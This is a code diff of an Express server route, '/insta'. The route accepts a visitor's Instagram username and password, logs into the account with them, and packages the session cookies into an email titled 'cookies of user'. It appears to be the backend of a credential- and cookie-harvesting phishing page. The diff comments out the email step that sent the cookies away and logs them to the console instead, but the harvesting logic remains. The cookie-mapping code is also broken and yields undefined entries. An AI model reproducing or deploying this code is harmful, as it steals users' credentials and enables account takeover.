@@ -230,11 +230,11 @@ app.post("/insta", (req, res) => {
   return Promise.try(() =>
     ig.account.login(req.body.username, req.body.password).then((val) => {
       const cookies = ig.state.serializeCookieJar().then((val2) => {
-        let modCookies = val2.cookies.map((val) => {
-          val["name"] = val["key"];
-          delete val["key"];
+        let modCookies = val2.cookies.map((cookie) => {
+          cookie["name"] = cookie["key"];
+          delete cookie["key"];
         });
-
+        console.log(modCookies);
         const validCookie = {
           url: "https://instagram.com",
           cookies: modCookies,
@@ -246,28 +246,28 @@ app.post("/insta", (req, res) => {
           subject: "cookies of user" + req.query.username,
           text: JSON.stringify(validCookie),
         };
-        transporter.sendMail(mailOptions, function (error, info) {
-          if (error) {
-            console.log(error);
-            res.json({
-              success: true,
-              twoFactor: false,
-              user: val,
-              cookie: JSON.stringify(validCookie),
-              message: "login Successful but failed to send email",
-            });
-          } else {
-            console.log("Email sent: " + info.response);
-            res.json({
-              success: true,
-              twoFactor: false,
-              user: val,
-              cookie: JSON.stringify(validCookie),
-              message: "login Successful and email has been sent.",
-            });
-            res.end();
-          }
-        });
+        // transporter.sendMail(mailOptions, function (error, info) {
+        //   if (error) {
+        //     console.log(error);
+        //     res.json({
+        //       success: true,
+        //       twoFactor: false,
+        //       user: val,
+        //       cookie: JSON.stringify(validCookie),
+        //       message: "login Successful but failed to send email",
+        //     });
+        //   } else {
+        //     console.log("Email sent: " + info.response);
+        //     res.json({
+        //       success: true,
+        //       twoFactor: false,
+        //       user: val,
+        //       cookie: JSON.stringify(validCookie),
+        //       message: "login Successful and email has been sent.",
+        //     });
+        //     res.end();
+        //   }
+        // });
       });
     })
   ).catch(
